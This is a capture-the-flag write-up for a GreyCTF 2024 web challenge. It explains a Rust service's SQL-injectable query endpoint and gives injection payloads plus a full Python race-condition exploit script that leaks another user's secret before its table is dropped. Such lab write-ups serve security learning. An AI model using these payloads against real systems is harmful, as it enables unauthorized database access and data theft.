# Challenge source
[Souce code](https://drive.google.com/file/d/1IOwj5JNcCKMUjy9zoB7va2HdgZga-Yrj/view?usp=drive_link)
# Difficulty
Medium

# Author
jro

# Approach
- The main site is just a simple web with the text "Hello, World!". We have nothing to do here, so I take a look at the source code.
- This webapp has some endpoints:
    1.  POST endpoint */register* allow us to register a new user. The user id is a 64-bits random unsigned interger:
       
    ```rust
    async fn register(State(state): State<AppState>) -> impl IntoResponse {
      let uid = rand::random::<u64>();
      let mut users = state.users.write().await;
      let user = User::new();
      users.insert(uid, user);
      uid.to_string()
    }
    ```

    2. POST endpoint */query* allow us to perform SQL query. Some of jobs are done:
       + Get user_id from registered uid
           ```rust
           async fn query(State(state): State<AppState>, Json(body): Json<Query>) -> axum::response::Result<String> {
            let users = state.users.read().await;
            let user = users.get(&body.user_id).ok_or_else(|| "User not found! Register first!")?;
            let user = user.clone();
        
            // Prevent registrations from being blocked while query is running
            // Fearless concurrency :tm:
            drop(users);
        
            // Prevent concurrent access to the database!
            // Don't even try any race condition thingies
            // They don't exist in rust!
            let _lock = user.lock.lock().await;
            let mut conn = state.pool.get_conn().await.map_err(|_| "Failed to acquire connection")?;
           ```
       + Randomize the name of a table using SHA1 hash function by hasing the string "fearless_concurrency" plus the user_id (in little endian format), then concatenate the hash (in hex string) with a random 32-bits unsigned interger
           ```rust
            // Unguessable table name (requires knowledge of user id and random table id)
            let table_id = rand::random::<u32>();
            let mut hasher = Sha1::new();
            hasher.update(b"fearless_concurrency");
            hasher.update(body.user_id.to_le_bytes());
            let table_name = format!("tbl_{}_{}", hex::encode(hasher.finalize()), table_id);
        
            let table_name = dbg!(table_name);
            let qs = dbg!(body.query_string);
        
            // Create temporary, unguessable table to store user secret
            conn.exec_drop(
                format!("CREATE TABLE {} (secret int unsigned)", table_name), ()
            ).await.map_err(|_| "Failed to create table")?;
           ```
       + Insert user's secret into that random named table
           ```rust
            conn.exec_drop(
            format!("INSERT INTO {} values ({})", table_name, user.secret), ()
            ).await.map_err(|_| "Failed to insert secret")?;
           ```
       + Perform user's query string. Notice that it is vulnerable to SQL injection:
           ```rust
            // Secret can't be leaked here since table name is unguessable!
            let res = conn.exec_first::<String, _, _>(
            format!("SELECT * FROM info WHERE body LIKE '{}'", qs), // <---- Vulnerable to SQL injection
            ()
            ).await;
           ```
       + After the query is completed, drop the table contains the secret:
           ```rust
            // You'll never get the secret!
            conn.exec_drop(
                format!("DROP TABLE {}", table_name), ()
            ).await.map_err(|_| "Failed to drop table")?;
        
            let res = res.map_err(|_| "Failed to run query")?;
           ```
       + Finally, return the query's result to us:
           ```rust
            if let Some(result) = res {
              return Ok(result);
            }
            Ok(String::from("No results!"))
           ```

    3. POST endpoint */flag* allow us to get the flag. But we have to provide the exact current user's secret to the server:
       ```rust
        async fn flag(State(state): State<AppState>, Json(body): Json<ClaimFlag>)  -> axum::response::Result<String> {
          let users = state.users.read().await;
          let user = users.get(&body.user_id).ok_or_else(|| "User not found! Register first!")?;
    
          if user.secret == body.secret {
              return Ok(String::from("grey{fake_flag_for_testing}"));
          }
           Ok(String::from("Wrong!"))
        }
       ```

  - We have to retrieve the secret of current user to gain the flag, but the question is: How to do it when the table is dropped immediately?
  - Notice that all function in the source code is *asynchronous*, so I think that there is a way to make the DROP TABLE query become slower. And, what we are going to do here is time-based SQL injection
  - The idea is, if we make the database sleep, the DROP TABLE query will not be executed, so it's possible to retrieve the secret.

# Attack
- First, we have to create a new user:

  ![image](https://github.com/NoSpaceAvailable/GreyCTF2024/assets/143888307/f86d6edc-98e8-43da-9442-929515fa084a)

- Then use that user id to perform query. I used SELECT SLEEP(5) and notice that the server is delayed for 5 seconds:
  
  ```json
    {
      "user_id":10386588119072549375,
      "query_string":"a' UNION SELECT SLEEP(5);-- "
    }
  ```

  ![image](https://github.com/NoSpaceAvailable/GreyCTF2024/assets/143888307/36160c0b-7c0b-4d48-9061-2fe86b3dbe7a)

- Looking at the source code, the table name's format will always be "tbl_....." so I use this query to retrieve the table name:
  
  ```json
    {
      "user_id":10386588119072549375,
      "query_string":"abc' UNION SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_name LIKE 'tbl_%'; -- "
    }
  ```

  ![image](https://github.com/NoSpaceAvailable/GreyCTF2024/assets/143888307/5447b218-1d07-40ee-9c81-58cef7a27478)

- But we need to do all these things faster to retrieve the secret table, so I made it a little automation using Python:
    
  ```python
    import requests
    from multiprocessing import Process
    import hashlib
    from time import sleep
    
    URL = "http://challs.nusgreyhats.org:33333"
    """
    Note:
    +> register: POST
    +> query: POST
    +> flag: POST
    +> / : GET
    """
    
    # code by black_phantom@NoSpaceAvailable
    
    def register(session : requests.Session):
        registration = session.post(url=f"{URL}/register").text
        return registration
    
    
    def get_flag(session : requests.Session, uid : int, secret : int):
        return session.post(
            url=f"{URL}/flag",
            json={"user_id":uid, "secret":secret}
        ).text
    
    
    def injection(session : requests.Session, uid : int, query_str : str):
        return session.post(
            url=f"{URL}/query",
            json={"user_id":uid, "query_string":query_str}
        )
    
    
    def get_secret(session : requests.Session, uid : int, tbl_name : str):
        """Retrieve secret from secret user"""
        query = f"abc' UNION SELECT secret FROM {tbl_name};-- "
        return injection(
            session=session,
            uid=uid,
            query_str=query
        ).text
    
    
    def sleep_db(uid : int):
        session = requests.session()
        query = f"abc' UNION SELECT SLEEP(1)--'"    # when the internet connection is good, sleep db 1 second is enough.
        injection (                                 # If not, try 10 seconds
            session=session,
            uid=uid,
            query_str=query
        )
        return None
    
    
    def get_tbl_name(session : requests.Session, uid : int):
        """Get table name of secret user, using another uid"""
        user_id = int(register(session))    # new uid to retrieve table name
        hasher = hashlib.sha1(b"fearless_concurrency" + uid.to_bytes(length=8, byteorder='little'))
        tbl_name = "tbl_{}".format(hasher.hexdigest())
        return injection(
            session=session,
            uid=user_id,
            query_str=f"abc' UNION SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_name LIKE '{tbl_name}%'; -- "
        ).text
    
    
    def main():
        session = requests.session()
        sleep_target = int(register(session))
        print(f"[✓] Registered secret user: {sleep_target}")
    
        process = Process(target=sleep_db, args=[sleep_target])
        print(f"[✓] User {sleep_target} is sleeping now ...")
        process.start()
    
        sleep(1)    # wait for process to start
    
        new_uid = int(register(session))
        print(f"[✓] Registered new user: {new_uid}")
    
        tbl_name = get_tbl_name(session, uid=sleep_target)
        print(f"[✓] Retrieved secret table: {tbl_name}")
    
        secret = get_secret(session, uid=new_uid, tbl_name=tbl_name)
        print(f"[✓] Retrieved secret: {secret}")
    
        flag = get_flag(session, uid=sleep_target, secret=int(secret))
        if "grey{" in flag:
            print(f"[✓] The flag is: {flag}")
    
    
    if __name__ == "__main__":
        main()
  ```

- Run the script and get the flag:

  ![image](https://github.com/NoSpaceAvailable/GreyCTF2024/assets/143888307/9fef2911-bcb6-48c4-81a0-93b5153580a4)

- Flag: grey{ru57_c4n7_pr3v3n7_l061c_3rr0r5}
